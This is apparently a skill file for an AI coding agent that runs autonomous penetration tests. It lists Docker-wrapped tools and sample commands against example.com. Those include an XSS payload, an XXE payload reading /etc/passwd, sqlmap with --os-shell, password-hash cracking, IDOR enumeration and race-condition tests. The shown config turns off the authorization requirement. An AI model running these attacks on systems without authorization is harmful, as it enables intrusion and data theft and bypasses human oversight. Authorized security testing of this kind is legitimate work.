---
name: shannon-pentest
description: "Autonomous penetration testing with Shannon. Execute security tools inside Docker containers — all commands run in Docker, real output returns to OpenCode's AI for analysis."
---

# Shannon Penetration Testing Skill

Autonomous pentesting powered by Docker-based security tools. OpenCode's AI does all reasoning — no separate API key needed. All tool execution happens inside a Docker container.

## Architecture

```
User -> OpenCode AI -> calls plugin tool -> tool runs `docker exec` -> real output returns -> AI reasons -> calls next tool
```

- **No separate AI sessions**: OpenCode's configured provider handles everything.
- **Docker only**: All security tools run inside the `shannon-tools` container. Nothing executes on the host.
- **Real output**: Every tool returns actual stdout/stderr from real security tools.

## Available Tools

### Docker Management
- **shannon_docker_init** -- Start the Shannon Docker container (call FIRST)
- **shannon_docker_cleanup** -- Stop and remove the container when done

### Core Execution
- **shannon_exec** -- Run ANY shell command inside Docker. The container has: nmap, sqlmap, nikto, subfinder, whatweb, gobuster, hydra, nuclei, ffuf, httpx, hashcat, john, curl, wget, dig, whois, Chromium + Playwright, Python3, and more.

### Phase-Specific Tools
- **shannon_recon** -- Run recon commands (nmap, subfinder, whatweb, dig, whois)
- **shannon_vuln_discovery** -- Run vuln scanning commands (nikto, sqlmap, gobuster, nuclei)
- **shannon_exploit** -- Run exploitation commands (authorized targets only)
- **shannon_report** -- Format findings into a structured report (markdown/json)

### Specialized Testing Tools
- **shannon_browser** -- Playwright browser automation for SPA/dynamic page testing. Essential for Angular, React, Vue apps where curl only sees the HTML shell.
- **shannon_idor_test** -- Systematic IDOR testing. Two modes: `manual` (run a specific curl command) or `auto` (auto-discover and test 17 common REST API patterns with ID enumeration).
- **shannon_upload_test** -- File upload vulnerability testing (XXE, YAML bomb, polyglot, extension bypass).

### Session & Analysis Tools
- **shannon_auth_session** -- Manage persistent authenticated sessions. Actions: `create`, `get`, `list`, `delete`, `build_headers`. Supports JWT, cookie, and custom header auth. Reuse sessions across IDOR, injection, and escalation tests.
- **shannon_js_analyze** -- Deep JS bundle analysis. Detects API keys, credentials, XSS sinks (innerHTML, eval, document.write), API endpoints, interesting comments, file paths. Provide a URL or local file path.
- **shannon_rate_limit_test** -- Rate limiting and timing attack tests. Modes: `burst` (rapid requests), `timing` (response time comparison for enumeration), `race` (concurrent requests for race conditions).
- **shannon_correlate_findings** -- Auto-correlate raw findings with OWASP Top 10, CWE IDs, and CVSS v3.1 scores. Input JSON array of findings, get structured report.

## Workflow

### 1. Initialize
```
Call shannon_docker_init to start the container
```

### 2. Reconnaissance
```
shannon_recon target="example.com" command="nmap -sV -sC -p 80,443 example.com"
shannon_recon target="example.com" command="subfinder -d example.com"
shannon_recon target="example.com" command="whatweb example.com"
shannon_exec command="dig example.com ANY"
shannon_exec command="whois example.com"
shannon_exec command="gobuster dir -u https://example.com -w /usr/share/wordlists/dirb/common.txt"
```

### 3. Vulnerability Discovery
```
shannon_vuln_discovery target="example.com" command="nikto -h https://example.com"
shannon_vuln_discovery target="example.com" command="nuclei -u https://example.com"
shannon_exec command="sqlmap -u 'https://example.com/page?id=1' --batch --level=3"
```

### 4. Browser-Based Testing (for SPAs)
```
shannon_browser target="https://example.com" script="
await page.goto('https://example.com')
title = await page.title()
print(f'Page title: {title}')
content = await page.content()
print(f'Body length: {len(content)}')
"
```

#### XSS Testing with Browser
```
shannon_browser target="https://example.com" script="
await page.goto('https://example.com/#/search?q=<img src=x onerror=alert(1)>')
await page.wait_for_timeout(2000)
content = await page.content()
if 'onerror' in content:
    print('VULNERABLE: Reflected XSS in search')
else:
    print('NOT VULNERABLE: Input sanitized')
"
```

#### Client-Side Storage Analysis
```
shannon_browser target="https://example.com" script="
await page.goto('https://example.com')
storage = await page.evaluate('''
    () => ({
        localStorage: Object.entries(localStorage),
        sessionStorage: Object.entries(sessionStorage),
        cookies: document.cookie
    })
''')
print(storage)
"
```

### 5. IDOR Testing
```
# Auto mode — discover and test common API patterns automatically
shannon_idor_test target="https://example.com" command="auto" mode="auto" auth_token="Bearer eyJ..." base_url="https://example.com/api"

# Manual mode — test specific endpoints
shannon_idor_test target="https://example.com" command="curl -s -w '\\nHTTP_CODE:%{http_code}' -H 'Authorization: Bearer USER_A_TOKEN' https://example.com/api/Users/2"
```

### 6. Session Management
```
# Create an authenticated session
shannon_auth_session action="create" target="https://example.com" login_endpoint="/api/login" session_type="jwt" credentials='{"email":"user@test.com","password":"pass"}'

# Build auth headers from a session for use in other tools
shannon_auth_session action="build_headers" session_id="sess-xxx"

# List all active sessions
shannon_auth_session action="list"
```

### 7. JS Bundle Analysis
```
# Analyze a JavaScript bundle for secrets, endpoints, and XSS sinks
shannon_js_analyze target="https://example.com" url="https://example.com/main.js"
```

### 8. Rate Limit & Race Condition Testing
```
# Burst test — check rate limiting on login
shannon_rate_limit_test target="https://example.com/api/login" action="burst" requests=50 method="POST" body='{"email":"test","password":"wrong"}'

# Timing test — detect user enumeration via response time difference
shannon_rate_limit_test target="https://example.com/api/login" action="timing" valid_input='{"email":"admin@admin.com","password":"wrong"}' invalid_input='{"email":"nonexistent@fake.com","password":"wrong"}'

# Race test — test concurrent coupon redemption
shannon_rate_limit_test target="https://example.com/api/apply-coupon" action="race" concurrent=10 body='{"coupon":"SAVE50"}'
```

### 9. File Upload Testing
```
shannon_upload_test target="https://example.com/file-upload" command="echo '<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>' > /tmp/xxe.xml && curl -X POST -F 'file=@/tmp/xxe.xml;type=text/xml' https://example.com/file-upload"
```

### 10. Exploitation (Authorized Only)
```
shannon_exploit target="example.com" command="sqlmap -u 'https://example.com/vuln?id=1' --os-shell"
```

### 11. Hash Cracking
```
shannon_exec command="echo 'e10adc3949ba59abbe56e057f20f883e' > /tmp/hashes.txt && hashcat -m 0 /tmp/hashes.txt /usr/share/wordlists/rockyou.txt --force"
shannon_exec command="john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/hashes.txt"
```

### 12. Finding Correlation
```
# Auto-correlate findings with OWASP/CWE/CVSS before final reporting
shannon_correlate_findings findings='[{"title":"SQL Injection in login","description":"Login endpoint vulnerable to SQL injection","evidence":"sqlmap confirmed","severity_hint":"critical","endpoint":"/api/login"}]'
```

### 13. Reporting
```
shannon_report target="example.com" findings="<paste all findings>" format="markdown"
```

### 14. Cleanup
```
shannon_docker_cleanup
```

## Configuration

In `~/.config/opencode/shannon-plugin.json`:

```json
{
  "shannon": {
    "require_authorization": false,
    "docker_enabled": true,
    "docker_image": "shannon-tools",
    "browser_testing": true,
    "idor_testing": true,
    "upload_testing": true
  }
}
```

- `require_authorization: false` -- For bug bounty / internal teams
- `docker_image` -- Must be pre-built: `docker build -t shannon-tools .`
- `browser_testing` -- Enable/disable Playwright browser tool
- `idor_testing` -- Enable/disable IDOR testing tool
- `upload_testing` -- Enable/disable file upload testing tool

## Vulnerability Categories Covered

| Category | Tools Used |
|----------|-----------|
| SQL Injection | sqlmap, shannon_exec (curl) |
| NoSQL Injection | shannon_exec (curl with $ne/$gt/$regex) |
| XSS (Reflected/Stored/DOM) | shannon_browser (Playwright), shannon_exec (curl), shannon_js_analyze (XSS sinks) |
| XXE | shannon_upload_test, shannon_exec |
| SSRF | shannon_exec (curl) |
| YAML Injection | shannon_upload_test |
| IDOR | shannon_idor_test (manual + auto mode) |
| Privilege Escalation | shannon_exec (curl with role injection) |
| File Upload Attacks | shannon_upload_test |
| Business Logic Flaws | shannon_exec (curl), shannon_browser, shannon_rate_limit_test (race conditions) |
| Auth/Session Issues | shannon_auth_session, shannon_exec, shannon_browser |
| Rate Limiting | shannon_rate_limit_test (burst/timing/race) |
| Information Disclosure | shannon_recon, shannon_exec, shannon_js_analyze (secrets, API keys) |
| Security Misconfig | shannon_vuln_discovery (nikto, nuclei) |
| Password Cracking | shannon_exec (hashcat, john) |
| Reporting & Correlation | shannon_correlate_findings (OWASP/CWE/CVSS), shannon_report |

## Ethics

**ONLY test systems you own or have explicit written authorization to test.**
Unauthorized testing is illegal under CFAA (US), Computer Misuse Act (UK), and similar laws.

## Limitations

- Docker must be installed and running
- The `shannon-tools` image must be built before first use
- Some tools require network access (container uses `--network host`)
- Complex exploitation may require human judgment
- Playwright browser testing requires Chromium in the Docker image (included in default build)

